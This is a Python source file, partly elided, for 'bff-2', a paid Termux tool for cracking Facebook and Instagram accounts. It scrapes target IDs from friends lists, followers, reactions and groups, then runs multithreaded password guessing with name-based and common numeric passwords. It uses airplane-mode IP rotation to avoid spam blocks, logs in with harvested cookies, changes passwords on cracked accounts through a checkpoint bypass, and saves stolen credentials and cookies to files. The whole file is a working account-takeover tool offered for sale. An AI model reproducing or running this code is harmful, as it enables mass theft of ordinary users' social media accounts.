...
try:
	...
	catet_req = ('# • currently installing requests . module •')
...
try:
	...
	catet_futur = ('# • is installing the futures module •')
...
try:
	...
	catet_bs = ('# • is installing the bs4 module •')
...
try:
	...
	catet_mek = ('# • is installing the mechanism module •')
...
try:
	...
	catet_mask = ('# • is installing the stdiomask module •')
...
bff_2.close()
if my_music !=0:
	catet_play = ('# • is installing play-audio •')
...
f"""{Hj}
 ...
 - author      : Mark Cornel
 - instagram   : mark.cornel97
 - facebook    : facebook.com/Mark
 - fanspage    : facebook.com/not yet
 - whatsap     : +2347013107449
 - github      : github.com/GUPTA-SHAKEL
 - script name : bff-2
 - version     : 1.3
 - update pada : 21 May 2022
 
+ ---------------------------------------- +
            ABOUT CRACK METHOD
+ ---------------------------------------- +
 - b-api: This method is a very fast process
           but prone to spam so the results are reasonable
           unsatisfactory and rarely get results

- mbasic: This method is quite slow
           but if using this method the result
           what you get is satisfying and rarely gets
           spam

- mobile: This method is a very slow process
           but if using this method the result
           what you get is very satisfying and rare
           got spam

+ ---------------------------------------- +
             NOT SUPPORT CARD 
+ ---------------------------------------- +
- Telkomsel card doesn't support crack, so it's natural if you don't get results or it takes a long time to crack, because it's prone to spam.  Axis card recommendation, XL.
 
+ ---------------------------------------- +
                AIRCRAFT MODE
+ ---------------------------------------- +
- If you use airplane mode, it's useful
   will pass some ID and change IP
   we are at the time of the crack process.  Just use
   airplane mode 1-2 seconds only.  If use
   airplane mode is too long, it will get worse
   Missed many IDs.  So that's enough
   use only 1-2 seconds.
  
{Mr}!{Mt} If there is a bug/error in the script, please report me
""")
...
sys.stdout.write('\x1b[1;35m\x1b]2; {×} TFY by Mark {×} \x07')
...
def Masuk():
	try:
		...
		os.system('clear')
		banner()
		print ('\n%s%s%s 01 %sLogin instagram (crack instagram account) '%(U,til,K,O))
		print ('%s%s%s 02 %sLogin via cookie (crack account facebook) '%(U,til,K,O))
		print ('%s%s%s 03 %sHow to get facebook cookies '%(U,til,K,O))
		print ('%s%s%s 00 %sExit '%(U,til,M,O))
		while True:
			rom = input ("\n%s# %sselect %s> %s"%(P,O,M,K))
			if rom in(""):
				print("%s%s correct content "%(M,til))
			elif rom in ('1','01'):
				checkin()
			elif rom in ('2','02'):
				...
				if kukis in(""):
					print ("%s%s and cookie fool "%(M,til))
					exit()
				else:
					konverter(kukis)
					masuk(kukis).login()
				...
				print (N)
				tutorial = ('''# To get cookies, prepare the kiwi browser application, download it on the play store if you haven't already.  If you have logged in to your Facebook account in the Kiwi browser, the account must be in data mode.  Copy link: https://chrome.google.com/webstore/detail/get-cookie/naciaagbkifhpnoodlkhbejjldaiffcm/related.  Type Y/y then enter to see a more complete tutorial!''')
				ah = rich.markdown.Markdown(tutorial, style='green')
				rich.console.Console().print(ah)
				nanya = input('%s%s%s want to see tutorials? %sy%s/%sn :%s '%(U,til,O,H,O,M,K))
				if nanya in(""):
					print ("%s%s I asked a question must be answered "%(M,til));jeda(2)
					masuk()
				elif nanya in("y","Y"):
					print (N)
					link = ('# Link tutorial: https://wa.me/+2347013107449')
					ah = rich.markdown.Markdown(link, style='green')
					rich.console.Console().print(ah)
					print ("%s%s open with WhatsApp "%(M,til));jeda(2)
				...
				exit("%s%s correct content "%(M,til))
...
def login_bot(romz):
	try:
		toket = romz
		romz1 = ('100052422791992')
		romz2 = ('100017988424248')
		romz3 = ('100026438372641')
...
class Menu():
	...
	def tentang(self):
		...
		if "mbasic_logout_button" not in a:
			...
			print ('%s•%s 01 %sCrack from friends list '%(U,P,O))
			print ('%s•%s 02 %sCrack of total followers'%(U,P,O))
			print ('%s•%s 03 %sCrack from reaction post'%(U,P,O))
			print ('%s•%s 04 %sCrack from post comments'%(U,P,O))
			...
			print ('%s•%s 11 %sCheckpoint detector'%(U,P,O))
			print ('%s•%s 12 %sInformation (about)'%(U,P,O))
			print ('%s•%s rm %sClear login data'%(U,P,O))
			print ('%s•%s 00 %sLog out (log out)'%(U,M,O))
...
class pilihan:
	...
	def menu(self):
		...
		slut = input('\n%s# %sselect %s> %s'%(P,O,M,K))
		if slut in['',' ']:
			print ('\n%s%s correct content'%(M,til));jeda(2)
			self.menu()
		elif slut in['1','01']:
			gan = input ("\n%s%s%s want mass crack id? y/t%s >%s "%(U,til,O,M,K))
			if gan in[""]:
				print ('\n%s%s correct content'%(M,til));jeda(2)
			elif gan in['y','Y']:
				try:
					...
					exit('\n%s%s failed to take id '%(M,til))
			elif gan in['t','T']:
				print ("\n%s%s %sMake sure your friends list is public "%(U,til,O))
			...
			print ("\n%s%s %sMake sure the target has followers "%(U,til,O))
			idt = input('%s%s %sUsername/Id%s > %s'%(U,til,O,M,K))
			if idt in[""," "]:
				print ('\n%s%s correct content'%(M,til));jeda(2)
			else:
			...
			try:
				...
				if "You Can't Use This Feature Now" in response:
					exit('\n%s%s account has been spammed, try again in a moment'%(M,til))
				elif "The page you requested was not found." in response:
					exit('\n%s%s Id not found '%(M,til))
				elif "Content Not Found" in response:
					exit('\n%s%s Id not found '%(M,til))
				else:
			...
			print ("\n%s%s %sMake sure the post is public not private "%(U,til,O))
			idt = input('%s%s %sPost url/link %s> %s'%(U,til,O,M,K))
			if idt in[""," "]:
				print ('\n%s%s correct content'%(M,til));jeda(2)
				self.menu()
			...
			try:
				...
				if "The requested page cannot be displayed now." in respon:
					exit('\n%s%s post not found'%(M,til))
				elif "You Can't Use This Feature Now" in respon:
					exit('\n%s%s account has been spammed, try again in a moment'%(M,til))
				else:
					try:
						print ('')
						...
						exit('\n%s%s Enter the correct post id'%(M,til))
			except requests.exceptions.ConnectionError:
				exit('\n\n%s%s no connection%s\n'%(M,til,N))
			...
			while True:
				print ("\n%s%s %sMake sure the group is public not private "%(U,til,O))
				...
				if idt in[""," "]:
					...
					try:
						...
						if "Page not found" in response:
							exit('\n%s%s group not found'%(M,til))
						elif "You Can't Use This Feature Now" in response:
							exit('\n%s%s account has been spammed, try again in a moment'%(M,til))
						elif "Content Not Found" in response:
							exit('\n%s%s group not found'%(M,til))
						else:
			...
			while True:
				print ("\n%s%s %sEnter the name of the person, for example Mark Cornel "%(U,til,O))
				idt = input('%s%s %sEnter name %s> %s'%(U,til,O,M,K))
				if idt in[""," "]:
					print ('\n%s%s correct content'%(M,til));jeda(2)
				else:
					try:
						response = requests.get(f"{self.url}/search/people/?q={idt}",cookies=self.kueh).text
						if "Sorry, we couldn't find" in response:
							exit('\n%s%s name not found'%(M,til))
						elif "You Can't Use This Feature Now" in response:
							exit('\n%s%s account has been spammed, try again in a moment'%(M,til))
						else:
							jumlah = int(input('%s%s %sNumber of names  %s> %s'%(U,til,O,M,K)))
			...
			try:
				...
				if "No Suggestions" in response:
					exit('\n%s%s no friend suggestions'%(M,til))
				elif "You Can't Use This Feature Now" in response:
					exit('\n%s%s account has been spammed, try again in a moment'%(M,til))
				else:
					print ('')
					jumlah = int(input('%s%s %sNumber of friends %s> %s'%(U,til,O,M,K)))
					if "6000" in str(jumlah):
						jumlah-=1
					if jumlah<6001:
			...
			print ("\n%s%s%s 01 %sCheck facebook account results "%(U,til,P,O))
			print ("%s%s%s 02 %sCheck Instagram account results "%(U,til,P,O))
			print ("%s%s%s 03 %sRemove crack results "%(U,til,P,O))
			print ("%s%s%s 00 %sReturn "%(U,til,M,O))
			rom = input('\n%s# %sselect %s> %s'%(P,O,M,K))
			cek_cek(rom)
		elif slut in['11']:
			file_cp()
			...
			print ('\n%s%s delete login data from termux '%(M,til));jeda(1)
			try:
	...
	def MassalGRAPH(self, token):
		try:
			jum = int(input('%s%s %sNumber of targets%s > %s'%(U,til,O,M,K)))
			print ("\n%s%s %sMake sure your friends list is public "%(U,til,O))
		except:jum=1
		for t in range(jum):
			t +=1
	...
	def FollowersPAR(self, data_):
		try:
			...
			for i in otw:
				...
				print(f"\r{U}{til}{O} Mengumpulkan Id {M}> {U}[{H}{len(self.id)}{U}] ",end="")
			if "View more" in respon:
				self.FollowersPAR(self.url+parser(respon,"html.parser").find("a",string="View more").get("href"))
		except:
			pass
	...
	def postingan(self, data_):
		try:
			...
			if "Semua 0" in respon:
				exit('\n%s%s no one responds to posts'%(M,til))
			else:
				...
				for i in otw:
					...
					print(f"\r{U}{til}{O} Mengumpulkan Id {M}> {U}[{H}{len(self.id)}{U}] ",end="")
				if "View more" in respon:
					self.postingan(self.url+parser(respon,"html.parser").find("a",string="View more").get("href"))
		except:
			pass
	...
	def komen(self, data_):
		try:
			...
			for i in otw.find_all("a",href=True):
				if "See more comments…" in i.text:
	...
	def grup(self, data_):
		try:
			...
			for i in otw:
				...
				print(f"\r{U}{til}{O} Mengumpulkan Id {M}> {U}[{H}{len(self.id)}{U}] ",end="")
			if "View more" in respon:
				self.grup(self.url+parser(respon,"html.parser").find("a",string="View more").get("href"))
			else:
				def tambah(gc):
						...
						for c in b:
							if "profile.php" in c[0]:
								...
								if d in self.id:
									...
									self.id.append(d+"<=>"+c[1])
							print(f"\r{U}{til}{O} Mengumpulkan Id {M}> {U}[{H}{len(self.id)}{U}] ",end="")
					if "See More Posts" in a:
						tambah(self.url+parser(a,"html.parser").find("a",string="See More Posts").get("href"))
		...
		try:
			...
			for i in otw:
				...
				if len(self.id)==jum:
					...
					break
			if true==False:
				if "See Next Results" in respon:
					self.nama(parser(respon,"html.parser").find("a",string="See Next Results").get("href"),jum)
		except:
			pass
					...
					try:
						for ip in list(f.pop()):
							if self.kueh.get(' c_user') in ip:
								...
								if 'Facebook user' in i.text.lower():
									continue
								self.id.append(ip+"<=>"+i.text)
					except Exception as e:
						continue
				if 'View Previous Message' in i.text:
	...
	def saran(self, data_, jum):
		try:
			...
			if true==False:
				if "view more" in respon:
					self.saran(self.url+parser(respon,"html.parser").find("a",string="view more").get("href"),jum)
		except:
			pass
...
def useragent():
	...
	print ("%s%s%s 02 %sCheck user agent "%(U,til,P,O))
	print ("%s%s%s 00 %sReturn "%(U,til,M,O))
	_romz_ = input('\n%s#%s select%s >%s '%(P,O,M,K))
	uas(_romz_)
	
def uas(_romz_):
	if _romz_ == '':
		print ('%s%s correct content'%(M,til));jeda(2)
		uas(_romz_)
	elif _romz_ in("1","01"):
		print ("%s%s%s Type %sMy user agent%s in browser google chrome\n%s%s%s to use your own user agent"%(U,til,O,H,O,U,til,O))
		print ("%s%s%s Type %sCancel%s to use the built-in user agent tools"%(U,til,O,H,O))
		...
		if ua in(""):
			...
			print ("\n%s%s using the default user agent "%(H,til));jeda(2)
			menu()
		open("ua.txt","w").write(ua);jeda(2)
		print ("\n%s%s successfully changed user agent"%(H,til));jeda(2)
		menu()
	elif _romz_ in("2","02"):
		try:
			ua_ = open('ua.txt', 'r').read();jeda(2)
			print ("%s%s%s your user agent%s : %s%s"%(U,til,O,M,H,ua_));jeda(2)
...
class Crack:
	...
	def romiy(self, id):
		...
		unikers = input('\n%s%s%s use manual password? y/t%s > %s'%(U,til,O,M,K))
		if unikers in ('Y', 'y'):
			print ('\n%s%s%s example%s >%s 445566%s,%s223344 to%s,%s556677'%(U,til,O,M,O,M,O,M,O))
			while True:
				pwx = input('%s%s%s password %s> %s'%(U,til,O,M,K))
				if pwx == '':
					print ('\n%s%s cant be empty '%(M,til))
				elif len(pwx)<=5:
					print ('\n%s%s Password minimum 6 characters'%(M,til))
					exit()
				else:
					def manual(brute=None):
						ind = input('\n%s#%s select %s>%s '%(P,O,M,K))
						if ind =='':
							print("%s%s correct content fool "%(M,til))
							manual()
						elif ind in ('1', '01'):
							print ('\n%s%s%s account %s[OK] %ssaved to file %s> %sOK/%s.txt'%(U,til,O,H,O,M,H,waktu));jeda(0.2)
							print ('%s%s%s account %s[%sCP%s]%s saved to file %s> %sCP/%s.txt'%(U,til,O,M,K,M,O,M,K,waktu));jeda(0.2)
							jalan ('\n%s!%s every crack 1k ID, play airplane mode 2 seconds \n'%(U,O));jeda(0.2)
							...
							print ('\n%s%s correct content fool'%(M,til))
							manual()
					print ('\n%s•%s [ %schoose the login method, please try one² %s]\n'%(U,O,U,O))
			...
			print("%s%s Correct content fool "%(M,til));jeda(2)
			pilihan().menu()
			...
			with ThreadPoolExecutor(max_workers=30) as TitidNeverDie:
				for akun in self.id: 
					try:
						uid, name = akun.split('<=>')
						ss = name.split(' ')
						pwx = [ name, ss[0]+ss[1], ss[0]+"123", ss[0]+"12345", ss[0]+"1234", "445566", "556677", "223344" ]
...
def hasil(ok,cp):
	...
	if len(ok) != 0 or len(cp) != 0:
		...
		if len(cp)==0:
			...
			c = input('\n%s%s%s use checkpoint detector? y/t%s > %s'%(U,til,O,M,K))
			if c =='':
				exit("%s%s Correct content fool "%(M,til))
			elif c in['Y','y']:
				jalan("\n%s•%s Airplane mode first 5 seconds "%(U,O))
				pw=input("%s%s%s change one tab account password? y/t %s> %s"%(U,til,O,M,K))
				if pw =='':
					print ("%s%s correct content fool "%(M,til))
				elif pw in['y','Y']:
					ubah_pass.append("ubah_sandi")
					pw2=input("%s%s%s enter password %s> %s"%(U,til,O,M,K))
					if len(pw2) <= 5:
						print("%s%s password minimum 6 characters "%(M,til))
					else:
						pwbaru.append(pw2)
				nomor=0
				for fb in cp:
					...
					ngecek  = akun.split(" ◊ ")
					nomor+=1
					print("\n%s%s.%s account login %s> %s%s"%(H,str(nomor),O,M,K,akun.replace(" *--> ","")));jeda(0.07)
					try:
						mengecek(ngecek[0].replace(" *--> ",""), ngecek[1])
					except requests.exceptions.ConnectionError:
						sys.stdout.write("\r%s• no connection "%(M)),
						sys.stdout.flush();jeda(1)
						pass
					except:
						pass
				print("\n%s%s%s Done checking account"%(U,til,O));jeda(0.07)
...
def cek_apk(kukis):
	...
	try:
		for i in range(len(game)):
			print ("\r      %s%s. %s%s"%(P,i+1,H,game[i].replace("Added to"," Added to")))
	except AttributeError:
	...
	try:
		for i in range(len(game)):
			print ("\r      %s%s. %s%s"%(P,i+1,M,game[i].replace("Expired"," Expired")))
	except AttributeError:
		print ("\r      %s• cookie invalid"%(M))
...
def file_cp():
	dirs = os.listdir('CP')
	print ("\n%s•%s [%s select the saved crack results to check the options %s]\n"%(U,O,U,O))
	for file in dirs:
...
def opsi():
	CP = ("CP/")
	romi = input("%s%s%s filename %s> %s"%(U,til,O,M,K))
	if romi == "":
		print("%s%scorrect content "%(M,til));jeda(2)
		opsi()
	try:
		file_cp = open(CP+romi, "r").readlines()
	except IOError:
		exit("\n%s%s filename %s not available"%(M,til,romi))
	jalan("%s•%s Airplane mode first 5 seconds "%(U,O))
	pw=input("\n%s%s%s change password on one tab account? y/t %s> %s"%(U,til,O,M,K))
	if pw in['y','Y']:
		ubah_pass.append("ubah_sandi")
		pw2 = input("%s%s%s enter password %s> %s"%(U,til,O,M,K))
		if len(pw2) <= 5:
			print("%s• password minimum 6 characters "%(M))
		else:
			pwbaru.append(pw2)
	print("\n %s# %s---------------------------------------- %s#"%(P,M,P));jeda(2)
	print ("%s%s%s total account %s: %s%s "%(U,til,O,M,K,str(len(file_cp))))
...
def mengecek(user,pw):
	...
	if "c_user" in session.cookies.get_dict():
		if "Your Account is Locked" in urlPost.text:
			print("\r%s• new session locked account"%(M))
		else:
			print("\r%s• the account does not checkpoint, please login "%(H))
			os.popen('play-audio dapet.mp3')
		...
		if(len(cek)==0):
			if "View the login details displayed.  This you?" in title:
				if "ubah_sandi" in ubah_pass:
					...
					if "Create a New Password" in re.findall("\<title>(.*?)<\/title>",str(ubahPw)):
						for b in resUbah("input"):
							dat2.update({b.get("name"):b.get("value")})
						dat2.update({"password_new":"".join(pwbaru)})
						an=session.post(url+link3.get("action"),data=dat2)
						coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
						print("\r%s%s one tab account, password successfully changed \n *--> %s ◊ %s ◊ %s			"%(H,til,user,pwbaru[0],coki))
						os.popen('play-audio dapet.mp3')
						open('OK/%s.txt' %(waktu), 'a').write(" *--> %s ◊ %s ◊ %s\n" % (user,pwbaru[0],coki))
						cek_apk(coki)
				else:
					print("\r%s%s one tab account, please login		"%(H,til))
					os.popen('play-audio dapet.mp3')
					open('OK/%s.txt' %(waktu), 'a').write(" *--> %s ◊ %s ◊ %s\n" % (user,pw,coki))
					cek_apk(coki)
			elif "Enter the Login Code to Continue" in re.findall("\<title>(.*?)<\/title>",str(response)):
				print("\r%s• account installed two-factor authentication			"%(M))
			else:
				print("%s%s there is an error"%(M,til))
		else:
			if "c_user" in session.cookies.get_dict():
				print("\r%s• the account does not checkpoint, please login "%(H))
				os.popen('play-audio dapet.mp3')
		...
		print("%s%s login failed, please check your id and password again"%(M,til))
...
def hapus_hasil():
	...
	print ('');jeda(2)
	jalan (H+' √ successfully removed the crack result ');jeda(2)
	pilihan().menu()
	
# CEK HASIL
def hasill():
	print ("\n%s%s%s 01 %sCheck account results %sOK "%(U,til,P,O,H))
	print ("%s%s%s 02 %sCheck account results %sCP "%(U,til,P,O,K))
	print ("%s%s%s 00 %sReturn "%(U,til,M,O))
...
def hasil_fb():
	...
	if l in['']:
		...
		dirs = os.listdir('OK')
		print ("\n%s•%s [%s saved crack results %s]\n"%(U,O,U,O))
		for file in dirs:
			print("%s•%s> %s%s"%(U,M,H,file));jeda(0.07)
		try:
			file = input("\n%s•%s input file %s:%s "%(U,O,M,H));jeda(0.2)
			if file in['']:
				exit("%s• correct content fool"%(M))
			totalok = open('OK/%s'%(file)).read().splitlines()
		except (KeyError, IOError):
			print("%s%s file does not exist "%(M,til))
		nm_file = ('%s'%(file)).replace('-', ' ')
		file_nm = nm_file.replace('.txt', '')
		print(" %s# %s---------------------------------------- %s#"%(P,M,P));jeda(2)
		jalan("%s•%s result date%s : %s%s %stotal %s: %s%s"%(U,O,M,H,file_nm,O,M,H,len(totalok)))
		...
		for file in dirs:
			print("%s•%s> %s%s"%(U,M,K,file));jeda(0.07)
		try:
			file = input("\n%s•%s input file %s:%s "%(U,O,M,K));jeda(0.2)
			if file in['']:
				exit("%s• correct content fool"%(M))
		...
		file_nm = nm_file.replace('.txt', '')
		print(" %s# %s---------------------------------------- %s#"%(P,M,P));jeda(2)
		jalan("%s•%s result date%s : %s%s %stotal%s : %s%s"%(U,O,M,K,file_nm,O,M,K,len(totalcp)))
...
def hasil_igehh():
	...
	try:
		c=input("\n%s•%s input file %s:%s "%(U,O,M,K))
		if c in['']:
			exit("\n%s• correct content fool"%(M))
		g=open("IG/%s"%(c)).read().splitlines()
	except FileNotFoundError:
		exit("\n%s• file not available"%(M))
	xx=c.split("-")
	xc=xx[0]
	print(" %s# %s---------------------------------------- %s#"%(P,M,P));jeda(2)
	print('%s%s%s Total account %s: %s%s '%(U,til,O,M,H,len(g)))
	print(" %s# %s---------------------------------------- %s#"%(P,M,P));jeda(2)
	for s in g:
		usr=s.split("|")[0]
		pwd=s.split("|")[1]
...
def login():
	...
	try:
		os.system('clear')
		catet_req = ('# Login with your Instagram account and make sure the account is public.  If the checkpoint login is required to use a new account, create a new account via the chrome browser')
		requ = rich.markdown.Markdown(catet_req, style='green')
		rich.console.Console().print(requ)
	...
	if x.get('status')=='success':
		...
		print ('\n%s%s Login successful √'%(H,til));jeda(2)
		checkin()
	elif x.get('status')=='checkpoint':
		exit ('\n%s%s Account hit session '%(M,til));jeda(2)
	else:
		exit ('\n%s%s Login failed, please try again '%(M,til));jeda(2)
...
class instagram:
	...
	def logo(self):
		...
		banner()
		print(f"""
{U}•{P} 01 {O}Crack from followers
{U}•{P} 02 {O}Crack from following
{U}•{P} 03 {O}Crack of name search
{U}•{P} 04 {O}Crack target 
{U}•{P} 05 {O}Check the status of the cracked account
{U}•{P} 06 {O}Bot auto unfollow
{U}•{P} rm {O}Delete account
{U}•{M} 00 {O}Exit
	""")
	
	def menu(self):
		self.logo()
		c=input('%s# %sselect %s> %s'%(P,O,M,K))
		if c=='':
			print ('\n%s%s correct content'%(M,til));jeda(2)
			self.menu()
		elif c in ('1','01'):
			print ("\n%s%s %sKeep in mind the target must be public "%(U,til,O))
			...
			print ("\n%s%s %sThe more targets the more IDs collected "%(U,til,O))
			m=int(input('%s%s %sNumber of targets%s > %s'%(U,til,O,M,K)))
			print('')
			for i in range(m):
				i+=1
				nama=input('%s•%s %s %sEnter name%s > %s'%(U,P,i,O,M,K))
			...
			print('%s%s%s Total account %s: %s%s '%(U,til,O,M,H,len(g)))
			print(" %s# %s---------------------------------------- %s#%s"%(P,M,P,K));jeda(2)
			print("\n%s•%s Please wait while checking account ... "%(U,O))
			for s in g:
				usr=s.split("|")[0]
				pwd=s.split("|")[1]
			...
			global following
			six=0
			print ("\n%s%s %sThe unfollow-All bot is running "%(U,til,O))
			...
			for i in following:
				...
				print (f"{U}{til}{O} {str(six)} {i} {H}Unfollow successful √")
			...
			os.remove('.kukis.log')
			os.remove('.username')
			jalan ("\n%s%s successfully deleted login data "%(M,til))
			exit()
		elif c in ('0','00'):
			exit()
		else:
	...
	def idAPI(self,cookie,id):
		try:
			...
			exit('\n%s%s the username you entered is wrong, make sure the target is public%s\n'%(M,til,N))
		return idx
	...
	def passwordAPI(self,xnx):
		...
		print(f"""
{U}{til}{O} [ {U}choose the crack method, please try one²{O} ]
...
{U}{til}{P} 03 {O}Methode {H}V.3 {O}(very slow)
	...
	def generateAPI(self,user,o):
		print(f"""
{U}{til}{O} [ {U}choose a user-agent, please try one²{O} ]
...
{U}{til}{P} 03 {O}User-Agent 3
		...
		if ua=='1':
			...
			uaAPI=user_agentAPI()
		print(f"""
{U}{til}{O} account {H}[OK] {O}saved to file {M}> {H}IG/OK-{day}.txt
{U}{til}{O} account {M}[{K}CP{M}] {O}saved to file {M}> {K}IG/CP-{day}.txt
{U}!{O} every 1k ID crack, play airplane mode 3 seconds
		""")
...
{J}╚══[{K} Following {M}> {K}{mengikut}
					...
					break
				elif 'Please wait a few minutes before trying again.' in str(x.text):
					sys.stdout.write(f"\r{M} ! exposed to spam, turn on airplane mode ");sys.stdout.flush();sleep(10)
...
def infohhh(username_dev, pass_dev, status):
	try:
		...
		if status == "":
			exit("\n%s• Your IP is spammed, airplane mode 3 seconds \n"%(M))
		else:
			print ("\r%s• %s : %s > %s             \n"%(M,status,username_dev,pass_dev))
			pass
	except:
...
def crack_target():
	...
	time.sleep(2)
	jalan ("%s%s%s Please wait ... "%(M,til,O))
	...
	pw_tambahan = ["223344", "445566", "556677", "102030", "334455", "203040", "@12345", "786787", "405060", "667788", "123456","12345678", "123456789"]
	for f in pw_tambahan:
		word_list_crack.append(f)
	print ("%s%s%s successfully created password "%(U,til,O));jeda(2)
	print 
...
{J}╚══[{H} Following  {M}> {H}{str(mengikuti)}
					...
					print ("\r%s! Airplane mode 2 seconds  "%(M))
...
class key:
	...
	def konfirmasi(self):
		...
		banner()
		print('\n')
		print ('\x1b[1;95m•\x1b[1;96m Please wait ...');jeda(1)
		digit = random.choice([20])
		id = get_license(digit)
		lpg = open('data/lisensi.txt', 'w')
		lpg.write(id)
		lpg.close()
		print ("\n\n%s•%s List price list %s:"%(U,O,M));jeda(0.07)
		print ("  %s-%s 20k 1 week"%(P,O));jeda(0.07)
		print ("  %s-%s 60k 1 month"%(P,O));jeda(0.07)
		jalan ('\n%s• %sLicence%s : %s%s'%(U,O,M,H,id));jeda(1)
		jalan ('%s• %sLicense Not Confirmed'%(U,O))
		suh=input("\n%s•%s want to buy license? y/t %s: %s"%(U,O,M,K))
		if suh in['']:
			exit()
		elif suh in["y","Y"]:
			jalan ("\n%s•%s go to whatsapp to buy license "%(U,O))
			jalan ("%s•%s my WhatsApp number %s: %s+2347013107449 "%(U,O,M,H))
			os.system('am start https://wa.me/+2347013107449?text=greetings+i+want+to+buy+licence:+'+id+'>/dev/null');jeda(1)
			exit()
		elif suh in["t","T"]:
			exit()
